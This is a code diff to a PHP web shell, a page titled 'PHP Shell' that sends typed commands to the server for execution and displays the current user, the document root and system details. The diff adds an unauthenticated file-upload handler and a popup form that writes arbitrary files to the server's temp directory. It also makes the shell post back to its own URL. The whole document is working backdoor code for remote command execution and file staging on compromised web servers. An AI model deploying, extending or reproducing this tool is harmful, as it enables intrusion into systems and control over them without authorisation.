@@ -6,6 +6,20 @@
 		foreach($out as $o)
        		echo $o . "\n";
 	}
+        else if(isset($_FILES['file']['tmp_name']))
+        {
+            $name = basename($_FILES['file']['name']);
+            if(move_uploaded_file($_FILES['file']['tmp_name'], $_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp" . "/" . basename($_FILES['file']['name']))) 
+            {
+                echo "<textarea style='color:white;'>$name: Success!</textarea>";
+            }
+            else
+            {
+                echo "<textarea style='color:white;'>$name: Failure!</textarea>";
+            }
+            exit();
+            
+        }
 	else
 	{
 ?>
@@ -20,6 +34,7 @@
   border: 0;
   overflow-y: hidden;
   background-color:black;
+  color: white;
 }
 html,body{
 height: 100%;
@@ -43,7 +58,7 @@ height: 100%;
   background-color: black;
   font-family:"Courier New",monospace;
   font-size:12px;
-  width: 90%;
+  width: 80%;
   height: 4%;
 }
 .info{
@@ -55,6 +70,20 @@ height: 100%;
   width: 100%;
   height: 2em;
   margin-top: -2em;
+}
+.popup{
+  position:absolute;
+  left: 0px;
+  top: 0px;
+  z-index:10;
+  border:5px;
+  border-style:double;
+  border-color:white;
+  height:100px;
+  width:400px;
+  font-family:"Courier New",monospace;
+  font-size:12px;
+ 
 }
 .push{
     height: 2em;
@@ -181,7 +210,7 @@ function updateData(param)
   	
 	document.form1.output.value+= "$: " + param + "\n";
 	document.form1.output.scrollTop = document.form1.output.scrollHeight;
-  	var myurl = "./shell.php";
+  	var myurl = <?php echo "\"" . $_SERVER['REQUEST_URI']. "\""; ?>
 
 	http.open("GET", myurl + "?id=" + escape(param), true);
 	http.onreadystatechange = useHttpResponse;
@@ -197,21 +226,31 @@ function useHttpResponse() {
   }
 }
 
+function fileUploadBox() {
+  var uploadDiv = document.createElement("div");
+  uploadDiv.setAttribute("align","center");
+  uploadDiv.id="upload_box";
+  uploadDiv.className = "popup"; 
+  uploadDiv.innerHTML="<form id='file_upload' method='post' enctype='multipart/form-data' target='uploader'><input name='file' id='file' type='file' /><br /><input type='submit' name='action' value='Upload to <?php echo htmlentities($_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp"); ?>' style='border:1px solid white;'/><br /><iframe name='uploader' id='uploader' src='<?php echo "./" . $_SERVER['REQUEST_URI'];?>' width='0' height='0' style='display:none;'></iframe></form><button name='close_button' class='button' type='button' style='height:3em;width:30%;' onclick='var element = document.getElementById(\"upload_box\"); element.parentNode.removeChild(element);' readonly=true>Close!</button>";
+  document.body.appendChild(uploadDiv);
+   
+}
 </script>
 
 </head>
-<div class="wrapper">
 <body onLoad="document.form1.input.focus(); document.form1.output.scrollTop = document.form1.output.scrollHeight" onKeyDown="return submitform(this, event)">
+<div class="wrapper">
 <form name="form1">
 <textarea name="output" class="output" readonly=true></textarea>
 <script>document.form1.output.value="";document.title="PHP Shell: " + window.location.hostname;</script>
 <textarea name="input" class="input"></textarea>
+<button name="upload_button" class="button" type="button" readonly=true onclick="fileUploadBox();">Upload!</button>
 <button name="submit_button" class="button" type="button" readonly=true onclick="updateData(document.form1.input.value); document.form1.input.value=''">Execute!</button>
 </form>
 <div class="push"></div>
 </div>
 <textarea name="info" class="info" readonly=true>
-<? 
+<?php 
 exec("whoami",$who);
 $pwd=$_SERVER["DOCUMENT_ROOT"];
 $sys=PHP_OS . ", " .$_SERVER['SERVER_SOFTWARE']. ", " . phpversion();
@@ -220,6 +259,6 @@ echo "user: $who[0]\tlocation: $pwd\tsystem: $sys";
 </textarea>
 </body>
 </html>
-<?
+<?php
 	}
 ?>
